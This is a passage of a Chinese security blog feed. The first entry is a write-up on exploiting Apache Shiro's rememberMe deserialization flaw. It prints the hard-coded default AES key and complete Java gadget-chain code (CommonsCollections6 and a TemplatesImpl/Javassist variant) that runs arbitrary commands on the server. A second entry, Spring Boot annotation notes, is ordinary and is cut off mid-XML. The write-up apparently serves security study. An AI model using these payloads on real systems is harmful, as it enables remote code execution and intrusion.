<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406000506-u1b6prl.png" alt="image.png"></p>
<h2 id="aes-key"><a href="#aes-key" class="headerlink" title="aes key"></a>aes key</h2><p>其实这个过程中可以发现一个很关键的问题，就是aes的密钥，如果密钥错了是不能够反序列化的</p>
<p>所以只有知道密钥才能够触发remberMe带来的反序列化漏洞，而在Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。官方针对这个漏洞的修复方式是去掉了默认的Key，生成随机的Key。所以高于这个版本的地方这个点就不能使用了。</p>
<h1 id="ACC6打shiro"><a href="#ACC6打shiro" class="headerlink" title="ACC6打shiro"></a>ACC6打shiro</h1><p>在刚刚的项目中也有一个shiroAttack项目，可以当作参考使用，但是这里我们还是自己建一个项目来生成payload</p>
<p>因为项目中有commons collections依赖，所以直接生成一个cc6来打</p>
<h2 id="Transformer数组型"><a href="#Transformer数组型" class="headerlink" title="Transformer数组型"></a>Transformer数组型</h2><p>CommonsCollections6.java</p>
<blockquote>
<p>其实参考p牛的写法，之后自己写的时候也可以效仿他getPayload的写法。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload(String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不再使用原CommonsCollections6中的HashSet，直接使用HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>对payload进行加密然后base64输出，这里的aes加密器使用shiro自带的<code>org.apache.shiro.crypto.AesCipherService</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generate1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>().getPayload(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">encoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="comment">//使用shiro默认的key对payload进行加密</span></span><br><span class="line">        <span class="type">byte</span>[] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">text</span> <span class="operator">=</span> encoder.encrypt(payload, key);</span><br><span class="line">        System.out.println(text.toString());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后设置为remberMe字段打进去</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406004852-gh6iook.png" alt="image.png"></p>
<p>随后tomcat报错，没有弹出计算器</p>
<blockquote>
<p>怎么根据报错调试：<a href="https://bbs.csdn.net/topics/390369450">https://bbs.csdn.net/topics/390369450</a></p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406002311-ineikiu.png" alt="image.png"></p>
<p>最后面可以看到报错信息<code>Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context,</code></p>
<p>然后下面其实可以快速到达报错的类，也就是这里抛出的异常，打断点调试</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406002428-3tlpqyr.png" alt="image.png"></p>
<blockquote>
<p>其实这里已经进入了刚刚分析的反序列化过程，看方法栈就能知道</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406002835-lql098z.png" alt="image.png"></p>
</blockquote>
<p>这个类继承了ObjectInputStream，并且重写了resolveClass方法</p>
<p>resolveClass方法是反序列化的时候通过字符串类名来查找类的方法，可以看到forName也是我们熟悉的，它将根据类名来返回这个类的class类类型。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406003002-uli0789.png" alt="image.png"></p>
<blockquote>
<p>这里和没重写之前的方法的差别在于：</p>
<p>一个使用原生类Class，这个我们都熟悉</p>
<p>另一个用的是ClassUtils，这个类位于org.apache.shiro.util包下</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406003325-9et2oi5.png" alt="image.png"></p>
<p>我们看一下org.apache.shiro.util.ClassUtils的forName方法：</p>
<p>调试多次之后发现前面的HashMap，TiedEntryMap，ChainTransformer都能返回clazz，但是到这个Transformer类就找不到了</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406003756-dpwbj29.png" alt="image.png"></p>
</blockquote>
<p>导致报错的地方就在这里：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406004253-n0kqmme.png" alt="image.png"></p>
<p>你可以清晰的看到类名前面是<code>[L</code>，<code>[L</code>是一个JVM的标记，说明实际上这是一个数组，即Transformer[]</p>
<p>reference：<a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p>
<blockquote>
<p>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p>
</blockquote>
<h2 id="TemplatesImpl字节码型"><a href="#TemplatesImpl字节码型" class="headerlink" title="TemplatesImpl字节码型"></a>TemplatesImpl字节码型</h2><p>因为它强行用的是shiro包自带的ClassUtil,所以要避免出现数组,可以参考思路:<a href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></p>
<p>因此我们可以考虑用TemplatesImpl字节码来打</p>
<blockquote>
<p>这个时候就考验对cc的学习程度了,因为上面我们发现了问题,就要自己通过CC中各种组件重新构造去解决这个问题</p>
<p>而重新构造意味着要自己编写payload</p>
<p>这里虽然p牛写好了,但是还是尽量自己去把整个exp从0到1写出来比较有体会.</p>
</blockquote>
<h3 id="如何加载TemplatesImpl"><a href="#如何加载TemplatesImpl" class="headerlink" title="如何加载TemplatesImpl"></a>如何加载TemplatesImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;<span class="string">&quot;/*bytes*/&quot;</span>&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure>

<h3 id="LazyMap-get"><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a>LazyMap.get()</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406015040-mbzwtgq.png" alt="image.png"></p>
<p>以往我们是这样触发TemplatesImpl的:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>但这里transform是可以传入一个参数key的,结合InvokeTransformer的transform方法:</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406015821-whcvobi.png" alt="image.png"></p>
<p>那我们可以直接传入,不用第一个<code>new ConstantTransformer(obj),</code>存在了,因为我们也知道这个类的作用就是:<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406015901-0cmid5c.png" alt="image.png"></p>
<p>所以就是这么个构造思路:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry.getValue()</span><br><span class="line">	LazyMap.get(key)</span><br><span class="line">		InvokeTransformer.transform()</span><br></pre></td></tr></table></figure>


<p>就是直接把那个类作为参数传给InvokeTransformer就行了,不用通过transform方法递归.</p>
<h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><p>构造令人头大….总之一步一步来</p>
<h4 id="解决TemplatesImpl的部分"><a href="#解决TemplatesImpl的部分" class="headerlink" title="解决TemplatesImpl的部分"></a>解决TemplatesImpl的部分</h4><p>我直接参照ysoserial的createTemplateImpl方法写</p>
<p>可以看到ysoserial的痕迹还是很足的,但是不影响它的可读性和好用性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">createTemplatesImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="comment">//修改Neo类，插入command，创建恶意字节码，此处参考ysoserial</span></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span>  <span class="variable">clazz</span> <span class="operator">=</span> pool.getCtClass(Neo.class.getName());</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">            command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">            <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我把原来ysoserial它修改字节码的基类自己重写了一个Neo类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Neo</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">(DOM document, SerializationHandler[] handlers )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="构造攻击链"><a href="#构造攻击链" class="headerlink" title="构造攻击链"></a>构造攻击链</h4><p>然后写getPayload方法</p>
<p>也可以参照ysoserial写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getPayload(String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getClass方法占位，之后换成newTransformer</span></span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, templatesImpl);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">finalMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    finalMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">    outerMap.clear();</span><br><span class="line">    setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">    oos.writeObject(finalMap);</span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406022837-asevmym.png" alt="image.png"></p>
<p>成功哈</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇其实开了个头,关于shiro还有很多攻击方法和知识.也算是稍微回顾了一下之前学的cc中的知识,感觉还是不错的</p>
<p>积累了LazyMap的新攻击姿势,这里mark一下</p>
<p>困死了,睡觉睡觉</p>
<h1 id="参考-amp-好文"><a href="#参考-amp-好文" class="headerlink" title="参考&amp;好文"></a>参考&amp;好文</h1><p><a href="http://xiashang.xyz/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B">http://xiashang.xyz/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B</a></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot学习笔记-基础，自动配置与开发插件</title>
    <url>/2022/05/11/springboot-web%E5%AD%A6%E4%B9%A001/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>感觉学这种框架开发还是要经常写博客记录一些问题，自己的博客嘛，反正是菜鸡也不建议乱一点hhh</p>
<p>spring文档：<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/index.html">https://docs.spring.io/spring-boot/docs/current/reference/html/index.html</a></p>
<p>spring，springmvc，springboot的一些知识：<a href="https://www.yijiyong.com/spring/basic/01-intro.html">https://www.yijiyong.com/spring/basic/01-intro.html</a></p>
<h1 id="底层注解"><a href="#底层注解" class="headerlink" title="底层注解"></a>底层注解</h1><blockquote>
<p>一些常见的底层注解</p>
</blockquote>
<h1 id="自动引导配置"><a href="#自动引导配置" class="headerlink" title="自动引导配置"></a>自动引导配置</h1><h2 id="SpringBootApplication"><a href="#SpringBootApplication" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h2><p>@SpringBootApplication<br>等同于<br>@SpringBootConfiguration<br>@EnableAutoConfiguration<br>@ComponentScan(“com.atguigu.boot”)</p>
<h1 id="组件添加"><a href="#组件添加" class="headerlink" title="组件添加"></a>组件添加</h1><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="@Configuration"></a>@Configuration</h2><p>@Configuration(proxyBeanMethods &#x3D; false) &#x2F;&#x2F;告诉SpringBoot这是一个配置类 &#x3D;&#x3D; 配置文件</p>
<ul>
<li>1、配置类里面使用@Bean标注在方法上给容器注册组件，默认也是单实例的</li>
<li>2、配置类本身也是组件</li>
<li>3、proxyBeanMethods：代理bean的方法</li>
<li>Full(proxyBeanMethods &#x3D; true)、【保证每个@Bean方法被调用多少次返回的组件都是单实例的】</li>
<li>Lite(proxyBeanMethods &#x3D; false)【每个@Bean方法被调用多少次返回的组件都是新创建的】</li>
<li>组件依赖必须使用Full模式默认。其他默认是否Lite模式</li>
</ul>
<h2 id="Bean"><a href="#Bean" class="headerlink" title="@Bean"></a>@Bean</h2><p>注册组件：自己编写Config类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration(<span class="params">proxyBeanMethods = false</span>)</span></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">MyConfig</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">    @Bean</span></span><br><span class="line">    public Car car01()&#123;</span><br><span class="line">        Car car = new Car(<span class="string">&quot;benz&quot;</span>,<span class="number">1000000000</span>);</span><br><span class="line">        <span class="keyword">return</span> car;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="meta">    @Bean(<span class="params"><span class="string">&quot;User001&quot;</span></span>)</span></span><br><span class="line">    public User user01()&#123;</span><br><span class="line">        User user = new User(<span class="string">&quot;Tom&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        user.setPet(new Pet(<span class="string">&quot;zhutousan&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">MainApplication</span> &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //返回IOC容器</span><br><span class="line">        ConfigurableApplicationContext run = SpringApplication.run(MainApplication.<span class="keyword">class</span>, args);</span><br><span class="line"></span><br><span class="line">        //从容器中获得组件</span><br><span class="line">        User user001 = run.getBean(<span class="string">&quot;User001&quot;</span>, User.<span class="keyword">class</span>);</span><br><span class="line">        System.out.println(user001.getPet());</span><br><span class="line"></span><br><span class="line">        //获取Config组件</span><br><span class="line">        MyConfig config = run.getBean( MyConfig.<span class="keyword">class</span>);</span><br><span class="line">        Car car = config.car01();</span><br><span class="line"></span><br><span class="line">        System.out.println(car);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Import、-ComponentScan"><a href="#Import、-ComponentScan" class="headerlink" title="@Import、@ComponentScan"></a>@Import、@ComponentScan</h2><p>@Import({User.class, DBHelper.class})<br>@Configuration(proxyBeanMethods &#x3D; false) &#x2F;&#x2F;告诉SpringBoot这是一个配置类 &#x3D;&#x3D; 配置文件<br>public class MyConfig {<br>}</p>
<h2 id="Conditional"><a href="#Conditional" class="headerlink" title="@Conditional"></a>@Conditional</h2><p>条件装配：满足Conditional指定的条件，则进行组件注入</p>
<p>@Import({User.class, DBHelper.class})<br>     给容器中自动创建出这两个类型的组件、默认组件的名字就是全类名</p>
<p>@ConditionalOnBean(name &#x3D; “tom”)<br>@ConditionalOnMissingBean(name &#x3D; “tom”)</p>
<h1 id="原生配置文件导入"><a href="#原生配置文件导入" class="headerlink" title="原生配置文件导入"></a>原生配置文件导入</h1><h2 id="ImportResource"><a href="#ImportResource" class="headerlink" title="@ImportResource"></a>@ImportResource</h2><p>支持原生配置文件</p>
<p>@ImportResource(“classpath:beans.xml”)</p>
<p>beans.xml:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">======================beans.xml=========================</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;haha&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.boot.bean.User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;zhangsan&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;18&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hehe&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.boot.bean.Pet&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tomcat&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span 